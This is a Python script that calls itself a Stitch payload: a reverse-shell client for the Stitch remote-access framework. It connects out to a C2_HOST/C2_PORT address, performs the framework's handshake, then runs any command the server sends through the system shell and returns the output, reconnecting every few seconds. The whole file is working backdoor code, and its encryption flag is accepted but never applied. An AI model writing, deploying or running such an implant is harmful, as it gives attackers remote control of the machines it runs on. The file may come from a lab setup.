#!/usr/bin/env python3
"""
Correct Stitch payload with proper handshake
Based on actual server code analysis
"""

import socket
import struct
import base64
import time
import subprocess
import sys
import os
import platform

class StitchPayload:
    def __init__(self, host='127.0.0.1', port=4040):
        self.host = host
        self.port = port
        self.socket = None
        self.aes_key = None
        
    def send_raw(self, data, encryption=False):
        """Send with Stitch protocol"""
        if isinstance(data, str):
            data = data.encode()
            
        # Pack size header
        size = struct.pack('>I', len(data))
        self.socket.sendall(size + data)
        
    def receive_raw(self):
        """Receive with Stitch protocol"""
        # Get size header
        size_data = self.socket.recv(4)
        if not size_data or len(size_data) < 4:
            return None
            
        size = struct.unpack('>I', size_data)[0]
        
        # Get data
        data = b''
        while len(data) < size:
            chunk = self.socket.recv(min(4096, size - len(data)))
            if not chunk:
                break
            data += chunk
            
        return data
        
    def connect_and_handshake(self):
        """Connect and perform Stitch handshake"""
        try:
            self.socket = socket.socket()
            self.socket.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            
            # Wait for server to add us to inf_sock
            time.sleep(0.5)
            
            # When shell command is run, server expects:
            # 1. base64('stitch_shell')
            print("[*] Sending stitch confirmation...")
            confirmation = base64.b64encode(b'stitch_shell')
            self.send_raw(confirmation, encryption=False)
            
            # 2. AES key identifier (using default for now)
            print("[*] Sending AES identifier...")
            # Check available keys
            aes_lib_path = '/workspace/Application/Stitch_Vars/st_aes_lib.ini'
            if os.path.exists(aes_lib_path):
                import configparser
                config = configparser.ConfigParser()
                config.read(aes_lib_path)
                # Use first available key
                if config.sections():
                    aes_id = config.sections()[0]
                else:
                    aes_id = 'default'
            else:
                aes_id = 'default'
                
            self.send_raw(aes_id.encode(), encryption=False)
            
            # 3. OS information
            print("[*] Sending OS information...")
            os_info = platform.system()  # 'Linux', 'Windows', or 'Darwin'
            self.send_raw(os_info.encode(), encryption=True)
            
            print("[+] Handshake complete")
            return True
            
        except Exception as e:
            print(f"[-] Handshake failed: {e}")
            return False
            
    def shell_loop(self):
        """Main command execution loop"""
        print("[*] Entering shell loop...")
        
        while True:
            try:
                # Receive command
                cmd_data = self.receive_raw()
                if not cmd_data:
                    print("[-] No data received, disconnecting...")
                    break
                    
                cmd = cmd_data.decode() if cmd_data else ''
                print(f"[*] Command: {cmd[:50]}")
                
                # Execute command
                if cmd == 'exit':
                    break
                elif cmd == 'whoami':
                    output = subprocess.check_output('whoami', shell=True).decode()
                elif cmd == 'pwd':
                    output = os.getcwd()
                elif cmd.startswith('echo '):
                    output = cmd[5:]
                else:
                    try:
                        result = subprocess.run(
                            cmd,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=10
                        )
                        output = result.stdout or result.stderr or "Command executed"
                    except subprocess.TimeoutExpired:
                        output = "Command timeout"
                    except Exception as e:
                        output = f"Error: {e}"
                
                # Send response
                self.send_raw(output.encode(), encryption=True)
                
            except KeyboardInterrupt:
                print("\n[-] Interrupted")
                break
            except Exception as e:
                print(f"[-] Error in loop: {e}")
                break
                
        self.socket.close()
        print("[-] Disconnected")
        
    def run(self):
        """Main execution"""
        while True:
            if self.connect_and_handshake():
                self.shell_loop()
            else:
                print("[*] Retrying in 5 seconds...")
                time.sleep(5)

if __name__ == "__main__":
    # Get config from environment or use defaults
    host = os.getenv('C2_HOST', '127.0.0.1')
    port = int(os.getenv('C2_PORT', '4040'))
    
    print(f"[*] Stitch Payload starting...")
    print(f"[*] Target: {host}:{port}")
    
    payload = StitchPayload(host, port)
    payload.run()